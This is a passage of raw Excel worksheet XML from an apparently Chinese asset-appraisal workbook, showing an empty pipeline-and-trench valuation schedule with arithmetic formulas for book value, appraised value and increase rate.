      <c r="I28" s="233" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="380" t="n"/>
      <c r="N28" s="555">
        <f>ROUND(L28*M28/100,-2)</f>
        <v/>
      </c>
      <c r="O28" s="555">
        <f>L28-J28</f>
        <v/>
      </c>
      <c r="P28" s="555">
        <f>N28-K28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>IF(K28=0,"",ROUND(P28/K28*100,2))</f>
        <v/>
      </c>
      <c r="R28" s="555">
        <f>IF(I28=0,"",ROUND(L28/I28,0))</f>
        <v/>
      </c>
      <c r="S28" s="243" t="n"/>
    </row>
    <row r="29" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="380" t="n"/>
      <c r="E29" s="587" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="233" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="380" t="n"/>
      <c r="N29" s="555">
        <f>ROUND(L29*M29/100,-2)</f>
        <v/>
      </c>
      <c r="O29" s="555">
        <f>L29-J29</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>N29-K29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>IF(K29=0,"",ROUND(P29/K29*100,2))</f>
        <v/>
      </c>
      <c r="R29" s="555">
        <f>IF(I29=0,"",ROUND(L29/I29,0))</f>
        <v/>
      </c>
      <c r="S29" s="243" t="n"/>
    </row>
    <row r="30" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="381" t="n"/>
      <c r="D30" s="380" t="n"/>
      <c r="E30" s="587" t="n"/>
      <c r="F30" s="380" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="380" t="n"/>
      <c r="I30" s="233" t="n"/>
      <c r="J30" s="555" t="n"/>
      <c r="K30" s="555" t="n"/>
      <c r="L30" s="555" t="n"/>
      <c r="M30" s="380" t="n"/>
      <c r="N30" s="555">
        <f>ROUND(L30*M30/100,-2)</f>
        <v/>
      </c>
      <c r="O30" s="555">
        <f>L30-J30</f>
        <v/>
      </c>
      <c r="P30" s="555">
        <f>N30-K30</f>
        <v/>
      </c>
      <c r="Q30" s="555">
        <f>IF(K30=0,"",ROUND(P30/K30*100,2))</f>
        <v/>
      </c>
      <c r="R30" s="555">
        <f>IF(I30=0,"",ROUND(L30/I30,0))</f>
        <v/>
      </c>
      <c r="S30" s="243" t="n"/>
    </row>
    <row r="31" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A31" s="116" t="n"/>
      <c r="B31" s="380" t="n"/>
      <c r="C31" s="381" t="n"/>
      <c r="D31" s="380" t="n"/>
      <c r="E31" s="587" t="n"/>
      <c r="F31" s="380" t="n"/>
      <c r="G31" s="380" t="n"/>
      <c r="H31" s="380" t="n"/>
      <c r="I31" s="233" t="n"/>
      <c r="J31" s="555" t="n"/>
      <c r="K31" s="555" t="n"/>
      <c r="L31" s="555" t="n"/>
      <c r="M31" s="380" t="n"/>
      <c r="N31" s="555">
        <f>ROUND(L31*M31/100,-2)</f>
        <v/>
      </c>
      <c r="O31" s="555">
        <f>L31-J31</f>
        <v/>
      </c>
      <c r="P31" s="555">
        <f>N31-K31</f>
        <v/>
      </c>
      <c r="Q31" s="555">
        <f>IF(K31=0,"",ROUND(P31/K31*100,2))</f>
        <v/>
      </c>
      <c r="R31" s="555">
        <f>IF(I31=0,"",ROUND(L31/I31,0))</f>
        <v/>
      </c>
      <c r="S31" s="243" t="n"/>
    </row>
    <row r="32" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A32" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B32" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C32" s="593" t="n"/>
      <c r="D32" s="567" t="n"/>
      <c r="E32" s="380" t="n"/>
      <c r="F32" s="115" t="n"/>
      <c r="G32" s="115" t="n"/>
      <c r="H32" s="233" t="n"/>
      <c r="I32" s="555">
        <f>SUM(I7:I31)</f>
        <v/>
      </c>
      <c r="J32" s="555">
        <f>SUM(J7:J31)</f>
        <v/>
      </c>
      <c r="K32" s="555">
        <f>SUM(K7:K31)</f>
        <v/>
      </c>
      <c r="L32" s="555">
        <f>SUM(L7:L31)</f>
        <v/>
      </c>
      <c r="M32" s="380" t="n"/>
      <c r="N32" s="555">
        <f>SUM(N7:N31)</f>
        <v/>
      </c>
      <c r="O32" s="555">
        <f>L32-J32</f>
        <v/>
      </c>
      <c r="P32" s="555">
        <f>N32-K32</f>
        <v/>
      </c>
      <c r="Q32" s="555">
        <f>IF(K32=0,"",ROUND(P32/K32*100,2))</f>
        <v/>
      </c>
      <c r="R32" s="555">
        <f>IF(H32=0,"",ROUND(L32/H32,0))</f>
        <v/>
      </c>
      <c r="S32" s="243" t="n"/>
    </row>
    <row r="33" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A33" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B33" s="284" t="inlineStr">
        <is>
          <t>减：构筑物及其他辅助设施减值准备</t>
        </is>
      </c>
      <c r="C33" s="593" t="n"/>
      <c r="D33" s="567" t="n"/>
      <c r="E33" s="565" t="n"/>
      <c r="F33" s="565" t="n"/>
      <c r="G33" s="565" t="n"/>
      <c r="H33" s="565" t="n"/>
      <c r="I33" s="555" t="n"/>
      <c r="J33" s="555" t="n"/>
      <c r="K33" s="555" t="n"/>
      <c r="L33" s="555" t="n"/>
      <c r="M33" s="380" t="n"/>
      <c r="N33" s="555" t="n"/>
      <c r="O33" s="555">
        <f>L33-J33</f>
        <v/>
      </c>
      <c r="P33" s="555">
        <f>N33-K33</f>
        <v/>
      </c>
      <c r="Q33" s="555">
        <f>IF(K33=0,"",ROUND(P33/K33*100,2))</f>
        <v/>
      </c>
      <c r="R33" s="555">
        <f>IF(H33=0,"",ROUND(L33/H33,0))</f>
        <v/>
      </c>
      <c r="S33" s="192" t="n"/>
    </row>
    <row r="34" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A34" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B34" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C34" s="593" t="n"/>
      <c r="D34" s="567" t="n"/>
      <c r="E34" s="380" t="n"/>
      <c r="F34" s="115" t="n"/>
      <c r="G34" s="115" t="n"/>
      <c r="H34" s="383" t="n"/>
      <c r="I34" s="555">
        <f>I32-I33</f>
        <v/>
      </c>
      <c r="J34" s="555">
        <f>J32-J33</f>
        <v/>
      </c>
      <c r="K34" s="555">
        <f>K32-K33</f>
        <v/>
      </c>
      <c r="L34" s="555">
        <f>L32-L33</f>
        <v/>
      </c>
      <c r="M34" s="380" t="n"/>
      <c r="N34" s="555">
        <f>N32-N33</f>
        <v/>
      </c>
      <c r="O34" s="555">
        <f>L34-J34</f>
        <v/>
      </c>
      <c r="P34" s="555">
        <f>N34-K34</f>
        <v/>
      </c>
      <c r="Q34" s="555">
        <f>IF(K34=0,"",ROUND(P34/K34*100,2))</f>
        <v/>
      </c>
      <c r="R34" s="555">
        <f>IF(H34=0,"",ROUND(L34/H34,0))</f>
        <v/>
      </c>
      <c r="S34" s="243" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="20">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="Q5:Q6"/>
    <mergeCell ref="J5:K5"/>
    <mergeCell ref="B2:S2"/>
    <mergeCell ref="L5:N5"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B1:S1"/>
    <mergeCell ref="B34:D34"/>
    <mergeCell ref="O5:P5"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="B33:D33"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="S5:S6"/>
    <mergeCell ref="B32:D32"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="Q3:S3"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="C5:C6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:S34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6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  <legacyDrawing xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="anysvml"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet61.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet58">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:R34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A3" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="M7" sqref="M7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="5.83333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="7" customWidth="1" style="410" min="5" max="5"/>
    <col width="16.3333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="4.33333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="14" max="16"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="17" max="17"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="18" max="18"/>
    <col width="9" customWidth="1" style="410" min="19" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>固定资产—管道和沟槽评估明细表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373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="373" t="n"/>
      <c r="P3" s="373" t="n"/>
      <c r="Q3" s="204" t="n"/>
      <c r="R3" s="606" t="inlineStr">
        <is>
          <t>表4-8-3</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="41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54" t="n"/>
      <c r="G4" s="402" t="n"/>
      <c r="H4" s="402" t="n"/>
      <c r="I4" s="402" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="376" t="n"/>
      <c r="O4" s="376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="R4" s="206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 xml:space="preserve"> 名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>长度
(m)</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>漕深
(m)</t>
        </is>
      </c>
      <c r="F5" s="264" t="inlineStr">
        <is>
          <t>沟宽*沟厚(mm*mm)
管径*壁厚(mm*mm)</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>材质</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>绝缘方式</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>建成年月</t>
        </is>
      </c>
      <c r="J5" s="188" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="M5" s="593" t="n"/>
      <c r="N5" s="567" t="n"/>
      <c r="O5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="P5" s="567" t="n"/>
      <c r="Q5" s="234" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="R5" s="209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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="O6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="P6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="Q6" s="594" t="n"/>
      <c r="R6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="180" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="587" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="380" t="n"/>
      <c r="N7" s="555">
        <f>ROUND(L7*M7/100,-2)</f>
        <v/>
      </c>
      <c r="O7" s="555">
        <f>L7-J7</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>N7-K7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>IF(K7=0,"",ROUND(P7/K7*100,2))</f>
        <v/>
      </c>
      <c r="R7" s="211" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="180" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="587" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="380" t="n"/>
      <c r="N8" s="555">
        <f>ROUND(L8*M8/100,-2)</f>
        <v/>
      </c>
      <c r="O8" s="555">
        <f>L8-J8</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>N8-K8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>IF(K8=0,"",ROUND(P8/K8*100,2))</f>
        <v/>
      </c>
      <c r="R8" s="211" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="180" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="587" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="380" t="n"/>
      <c r="N9" s="555">
        <f>ROUND(L9*M9/100,-2)</f>
        <v/>
      </c>
      <c r="O9" s="555">
        <f>L9-J9</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>N9-K9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>IF(K9=0,"",ROUND(P9/K9*100,2))</f>
        <v/>
      </c>
      <c r="R9" s="211" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="180" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="587" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="380" t="n"/>
      <c r="N10" s="555">
        <f>ROUND(L10*M10/100,-2)</f>
        <v/>
      </c>
      <c r="O10" s="555">
        <f>L10-J10</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>N10-K10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>IF(K10=0,"",ROUND(P10/K10*100,2))</f>
        <v/>
      </c>
      <c r="R10" s="211" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="180" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="587" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="380" t="n"/>
      <c r="N11" s="555">
        <f>ROUND(L11*M11/100,-2)</f>
        <v/>
      </c>
      <c r="O11" s="555">
        <f>L11-J11</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>N11-K11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>IF(K11=0,"",ROUND(P11/K11*100,2))</f>
        <v/>
      </c>
      <c r="R11" s="211" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="587" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="380" t="n"/>
      <c r="N12" s="555">
        <f>ROUND(L12*M12/100,-2)</f>
        <v/>
      </c>
      <c r="O12" s="555">
        <f>L12-J12</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>N12-K12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>IF(K12=0,"",ROUND(P12/K12*100,2))</f>
        <v/>
      </c>
      <c r="R12" s="211" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="587" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="380" t="n"/>
      <c r="N13" s="555">
        <f>ROUND(L13*M13/100,-2)</f>
        <v/>
      </c>
      <c r="O13" s="555">
        <f>L13-J13</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>N13-K13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>IF(K13=0,"",ROUND(P13/K13*100,2))</f>
        <v/>
      </c>
      <c r="R13" s="211" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="587" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="380" t="n"/>
      <c r="N14" s="555">
        <f>ROUND(L14*M14/100,-2)</f>
        <v/>
      </c>
      <c r="O14" s="555">
        <f>L14-J14</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>N14-K14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>IF(K14=0,"",ROUND(P14/K14*100,2))</f>
        <v/>
      </c>
      <c r="R14" s="211" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="587" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="380" t="n"/>
      <c r="N15" s="555">
        <f>ROUND(L15*M15/100,-2)</f>
        <v/>
      </c>
      <c r="O15" s="555">
        <f>L15-J15</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>N15-K15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>IF(K15=0,"",ROUND(P15/K15*100,2))</f>
        <v/>
      </c>
      <c r="R15" s="211" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="587" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="380" t="n"/>
      <c r="N16" s="555">
        <f>ROUND(L16*M16/100,-2)</f>
        <v/>
      </c>
      <c r="O16" s="555">
        <f>L16-J16</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>N16-K16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>IF(K16=0,"",ROUND(P16/K16*100,2))</f>
        <v/>
      </c>
      <c r="R16" s="211" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="587" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="380" t="n"/>
      <c r="N17" s="555">
        <f>ROUND(L17*M17/100,-2)</f>
        <v/>
      </c>
      <c r="O17" s="555">
        <f>L17-J17</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>N17-K17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>IF(K17=0,"",ROUND(P17/K17*100,2))</f>
        <v/>
      </c>
      <c r="R17" s="211" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="587" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="380" t="n"/>
      <c r="N18" s="555">
        <f>ROUND(L18*M18/100,-2)</f>
        <v/>
      </c>
      <c r="O18" s="555">
        <f>L18-J18</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>N18-K18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>IF(K18=0,"",ROUND(P18/K18*100,2))</f>
        <v/>
      </c>
      <c r="R18" s="211" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="587" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="380" t="n"/>
      <c r="N19" s="555">
        <f>ROUND(L19*M19/100,-2)</f>
        <v/>
      </c>
      <c r="O19" s="555">
        <f>L19-J19</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>N19-K19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>IF(K19=0,"",ROUND(P19/K19*100,2))</f>
        <v/>
      </c>
      <c r="R19" s="211" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="587" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="380" t="n"/>
      <c r="N20" s="555">
        <f>ROUND(L20*M20/100,-2)</f>
        <v/>
      </c>
      <c r="O20" s="555">
        <f>L20-J20</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>N20-K20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>IF(K20=0,"",ROUND(P20/K20*100,2))</f>
        <v/>
      </c>
      <c r="R20" s="211" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="587" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="380" t="n"/>
      <c r="N21" s="555">
        <f>ROUND(L21*M21/100,-2)</f>
        <v/>
      </c>
      <c r="O21" s="555">
        <f>L21-J21</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>N21-K21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>IF(K21=0,"",ROUND(P21/K21*100,2))</f>
        <v/>
      </c>
      <c r="R21" s="211" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="587" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="380" t="n"/>
      <c r="N22" s="555">
        <f>ROUND(L22*M22/100,-2)</f>
        <v/>
      </c>
      <c r="O22" s="555">
        <f>L22-J22</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>N22-K22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>IF(K22=0,"",ROUND(P22/K22*100,2))</f>
        <v/>
      </c>
      <c r="R22" s="211" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="587" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="380" t="n"/>
      <c r="N23" s="555">
        <f>ROUND(L23*M23/100,-2)</f>
        <v/>
      </c>
      <c r="O23" s="555">
        <f>L23-J23</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>N23-K23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>IF(K23=0,"",ROUND(P23/K23*100,2))</f>
        <v/>
      </c>
      <c r="R23" s="211" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
